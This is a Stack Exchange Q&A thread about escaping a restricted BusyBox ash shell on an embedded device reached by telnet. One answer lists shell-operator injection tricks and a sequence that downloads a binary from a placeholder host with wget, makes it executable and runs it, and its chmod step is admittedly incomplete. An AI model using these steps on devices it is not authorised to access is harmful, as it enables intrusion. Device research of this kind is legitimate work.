{
    "title": "Limited BusyBox shell",
    "link": "https://reverseengineering.stackexchange.com/questions/13402/limited-busybox-shell",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I'm testing some  embedded device, and there is lack of documentation. When I telnet to device, I get only limited shell.</p>\n<pre><code>BusyBox v1.19.2 (built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n# help\nBuilt-in commands:\n------------------\n        . : [ [[ bg break cd chdir continue echo eval exec exit export\n        false fg getopts hash help jobs kill local printf pwd read readonly\n        return set shift source test times trap true type ulimit umask\n        unset wait\n</code></pre>\n<p>This is limited shell, its not clear, how to get into the full shell?</p>\n</div>",
    "votes": "0",
    "answers": 3,
    "views": "9k",
    "tags": [
        "linux",
        "firmware",
        "embedded",
        "networking"
    ],
    "user": "fxgreen",
    "time": "Sep 3, 2016 at 12:58",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<ul>\n<li>The command you need is <code>chsh</code> (change shell) - this is part of the\n<code>shadow</code> or <code>shadow-utils</code> package.</li>\n<li><p>You can also manually edit <code>/etc/password</code> to change the shell from \n<code>/bin/ash</code> to something else:</p>\n<p><strong>BUT =&gt; be very careful that the new shell exists or you will lock yourself out !!!</strong></p></li>\n</ul>\n<hr/>\n<p>You will need to be <code>root</code> to do either of the above.</p>\n</div>",
            "votes": "3",
            "user": "Stuart Cardall",
            "time": "Apr 14, 2017 at 18:14",
            "is_accepted": false,
            "comments": []
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>BusyBox is mainly focused on size-optimizing and commands could be excluded/included during compile time. So, without providing additional informations, it seems to be a very limited set of <a href=\"https://busybox.net/BusyBox.html\" rel=\"nofollow\">installed components</a>.</p>\n<p>However, it should be clear, that this doesn't mean that the firmware of the device doesn't support specific utilities per se. If this is not flully clear, you should take a look at the <a href=\"https://busybox.net/FAQ.html#whatis\" rel=\"nofollow\">FAQ - What is Busybox</a> section. Some cites should make this fully clear:</p>\n<blockquote>\n<p>\"Can I enable FTP?\" - \"We don't know whether Foomatic-9000 firmware\n  comes with Busybox binary with enabled ftpd applet. (If you have\n  access to shell prompt, try running \"busybox ftpd --help\"). If it\n  does, you probably will be able to enable it. Unfortunately, we don't\n  know how Foomatic-9000 firmware manages starting and stopping of\n  various services (in case they already have ftpd sevice and it is just\n  disabled), or how to create and enable a new service on Foomatic-9000\n  (if they dont). Try googling for it.\"</p>\n<p>\"Can I enable SCP?\" - \"Busybox-1.23.4 does not have scp applet.\n  However, Foomatic-9000 might have scp installed (say, if they have\n  dropbear installed), and it may be possible to enable it. If not, it\n  may be possible to build and install your own scp tool. Try googling\n  for it.\"</p>\n</blockquote>\n<p>You should probably focus more on the specific device and installed firmware, than concentrate on the limited set of components linked to Busybox itself.</p>\n</div>",
            "votes": "2",
            "user": "knx",
            "time": "Aug 31, 2016 at 20:21",
            "is_accepted": false,
            "comments": [
                {
                    "user": "fxgreen",
                    "text": "<span class=\"comment-copy\">ok, forgot cli command.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Unfortunately for you, nowadays most embedded devices (i.e. routers, iot devices, etc..) try to prevent the users to access the inner system so they can't hack or modify it. This is a measure to prevent the work of botnets like mirai, though the protections are not always very effective.</p>\n<p>A limited busybox shell is a very common scenario. Luckily, speaking in general, busybox requires an underlying shell if there's any kind of user interface (like telnet or ssh). This means that it may be possible to bypass that shell and run commands on the underlying shell (i.e. /bin/sh is very common).</p>\n<p>Before trying to escape the busybox sandbox, you must have in account the following:</p>\n<ul>\n<li>The manufacturer may have modified the busybox shell to patch this techniques</li>\n<li>The underlying shell can be an (full or partial) unprivileged shell. This means that even if you manage to run commands on it, they may not work or tell you that you don't have enough rights.</li>\n<li>The underlying shell may be also another limited shell (not common)</li>\n</ul>\n<p>Once you are ready, you can try the following \"tricks\":\n(All of the rely on shell operators)</p>\n<p>Try things like</p>\n<pre><code>echo \"Hello World\" &amp; &lt;your command&gt;\n</code></pre>\n<p>This will execute your command if:</p>\n<ol>\n<li>The binary is available (so basically if it's installed in the system)</li>\n<li>The shell has access to it (privileges)</li>\n</ol>\n<p>There are other methods like:</p>\n<pre><code>echo \"Hello World\" `your command`\necho \"Hello World\" || &lt;your command&gt;\n</code></pre>\n<p>And other variations you can find over the internet or try by yourself.</p>\n<p>EDIT: I'm editing to add an example of how you could escape the shell and gain further execution.</p>\n<pre><code>echo \"Hello World\" &amp; wget yourweb.com/yourbinary\necho \"Hello World\" &amp; chmod yourbinary \necho \"Hello World\" &amp; ./yourbinary\n</code></pre>\n<p>or directly ./yourbinary</p>\n<p>That's the idea. As for the chmod sorry but I don't remember the exact arguments to give execution permissions.</p>\n<p>EDIT2: I've noticed your shell says ash, so probably busybox has been executed from an (automated) script running from ash. In this case you would like to directly run commands on the /bin/ash shell.</p>\n</div>",
            "votes": "1",
            "user": "78dtat78da",
            "time": "Apr 16, 2017 at 16:32",
            "is_accepted": false,
            "comments": []
        }
    ]
}